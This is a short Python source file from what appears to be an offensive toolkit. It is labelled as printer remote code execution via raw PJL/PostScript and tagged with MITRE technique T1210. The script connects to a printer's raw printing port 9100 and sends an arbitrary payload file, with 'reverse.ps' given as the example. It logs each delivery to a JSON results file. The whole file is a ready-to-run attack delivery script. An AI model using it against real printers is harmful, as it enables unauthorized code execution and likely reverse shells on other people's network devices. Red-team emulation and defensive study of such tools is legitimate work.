# modules/attacks/printer_rce_payload.py

import socket
import argparse
import json
from datetime import datetime
import os

LOG_PATH = "results/printer_rce_logs.json"
MITRE_TTP = "T1210"

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_raw_payload(ip, port, payload_path):
    with open(payload_path, "rb") as f:
        payload = f.read()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        s.send(payload)
        log_event({
            "timestamp": datetime.utcnow().isoformat(),
            "printer_ip": ip,
            "port": port,
            "payload_file": payload_path,
            "size": len(payload),
            "ttp": MITRE_TTP
        })
        return True
    except Exception:
        return False
    finally:
        s.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Printer RCE via Raw PJL/PostScript")
    parser.add_argument("--ip", required=True, help="Printer IP")
    parser.add_argument("--port", type=int, default=9100, help="Printer port (usually 9100)")
    parser.add_argument("--payload", required=True, help="Payload file path (e.g., reverse.ps)")
    args = parser.parse_args()

    if send_raw_payload(args.ip, args.port, args.payload):
        print("[+] Payload delivered to printer")
    else:
        print("[!] Failed to deliver payload")
